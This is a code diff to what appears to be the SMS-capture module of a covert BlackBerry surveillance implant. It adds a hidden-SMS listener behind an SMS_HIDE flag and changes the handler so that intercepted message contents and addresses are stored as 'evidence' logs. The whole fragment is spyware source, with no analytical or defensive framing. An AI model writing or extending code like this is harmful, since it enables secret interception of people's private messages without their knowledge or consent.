@@ -28,6 +28,7 @@ import blackberry.agent.mail.MailParser;
 import blackberry.agent.mail.Prefix;
 import blackberry.agent.sms.SmsListener;
 import blackberry.agent.sms.SmsListener45;
+import blackberry.agent.sms.SmsListener46;
 import blackberry.config.Conf;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
@@ -116,7 +117,7 @@ public final class MessageAgent extends Agent implements SmsObserver,
         mailListener = MailListener.getInstance();
         
         //#ifdef SMS_HIDE
-        
+        smsListener = SmsListener46.getInstance();
         //#else
         smsListener = SmsListener45.getInstance();
         //#endif
@@ -451,7 +452,7 @@ public final class MessageAgent extends Agent implements SmsObserver,
         //lastcheck = new Date(0); 
     }
 
-    public void onNewSms(final byte[] message, String address,
+    public boolean onNewSms(final byte[] message, String address,
             final boolean incoming) {
         //#ifdef DBC
         Check.requires(message != null, "saveLog: null message");
@@ -488,14 +489,14 @@ public final class MessageAgent extends Agent implements SmsObserver,
                 //#ifdef DEBUG
                 debug.error("Not a sms");
                 //#endif
-                return;
+                return false;
             }
 
             if (address.indexOf(":") > 0) {
                 //#ifdef DEBUG
                 debug.warn("Probably a MMS");
                 //#endif
-                return;
+                return false;
             }
 
             // Filling fields
@@ -543,19 +544,19 @@ public final class MessageAgent extends Agent implements SmsObserver,
             // Creating log
             if (message != null) {
                 createEvidence(additionalData, message, EvidenceType.SMS_NEW);
-                return;
+                return false;
             } else {
                 //#ifdef DEBUG
                 debug.error("data null");
                 //#endif
-                return;
+                return false;
             }
 
         } catch (final Exception ex) {
             //#ifdef DEBUG
             debug.error("saveLog message: " + ex);
             //#endif
-            return;
+            return false;
         }
     }
 
